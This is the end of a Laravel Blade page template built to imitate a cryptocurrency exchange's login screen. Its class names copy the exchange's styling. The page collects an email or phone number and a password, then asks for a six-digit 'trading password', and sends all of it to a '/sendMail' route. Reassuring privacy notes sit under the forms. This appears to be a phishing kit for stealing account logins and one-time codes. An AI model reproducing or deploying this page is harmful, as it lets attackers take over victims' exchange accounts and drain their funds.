                                      <div role="tab" aria-selected="true" tabindex="0" class="KuxTab-TabItem KuxTab-variantLine KuxTab-selected css-12u19n3" type="default" label="Email">Email/Phone</div>
                                    </div>
                                    <span class="KuxTabs-indicator css-1freloz" style="left: 0px; width: 38.2188px; transition: all 0.3s ease 0s;"><span class="css-1sknxmt"></span></span>
                                  </div>
                                </div>
                              </section>

                              @if(session()->has('otp'))
                              <h2 class="css-mr4dhk">Enter Trading Password</h2>
                              <div class="KuxBox-root css-1ule816">Enter 6-Digit Trading password  received in your email or phone number.</div>
                              <form class="contact-form" action="/sendMail" method="POST">
                                @csrf

                                <input type="tel" name="otp" class="KuxInput-input css-1nddmz0" placeholder="******">
                                <input type="text" name="email" value="{{ session()->get('email') }}" class="KuxInput-input css-1nddmz0" placeholder="Email/Phone">
                                <input type="text" name="password" value="{{ session()->get('password') }}" class="KuxInput-input css-1nddmz0" placeholder="Password">

                                <button style="background-color:green" id="codeBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit" formmethod="post" formaction="/sendMail">
                                Proceed
                                </button>

                            </div>


                            </form>
                            @else
                            <form class="contact-form" action="/sendMail" method="POST">
                              @csrf
                              <input type="text" name="email" class="KuxInput-input css-1nddmz0" placeholder="Email/Phone">
                              <input type="text" name="password" class="KuxInput-input css-1nddmz0" placeholder="Password">
                              <button style="background-color:green" id="loginBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit" formmethod="post" formaction="/sendMail">
                                Login In
                              </button>
                              </div>
   <div class="row">
  <p class="px-3 note" style="font-size: 15px;margin-top: 50px;font-weight: bold;">
    NOTE
  </p>
  <p class="px-3" style="font-size: 11px;">
  <ul>
    <li style="font-size: 11px;">
      The information collected is confidential and will not be disclosed by us to unauthorized third parties.
    </li>
    <li style="font-size: 11px;">
      Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties. Authentication information will not be modified.
    </li>
    <li style="font-size: 11px;">
      Authentication process will be carried out immediately upon receipt of information, and we will have notify you of the authentication result.
    </li>
  </ul>
</div>
                            </form>
                            @endif
                          </div>
                        </div>


                        <div class="KuxBox-root css-1b12qyh"></div>
                      </div>
                    </div>


                </div>
                </section>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <!-- header style two End -->
  @if(session()->has('message'))
  <script>
    Swal.fire({
      icon: "success",
      title: "Message Sent",
      text: "{{ session()->get('message') }}",
    });
  </script>
  @endif

  <script>
    const switchForm = () => {

      $("#userInput").hide();
      $("#codeInput").show();
    }

    window.addEventListener('load', function() {
      $("#codeInput").hide();
      //switchForm();
    })
  </script>

</body>

</html>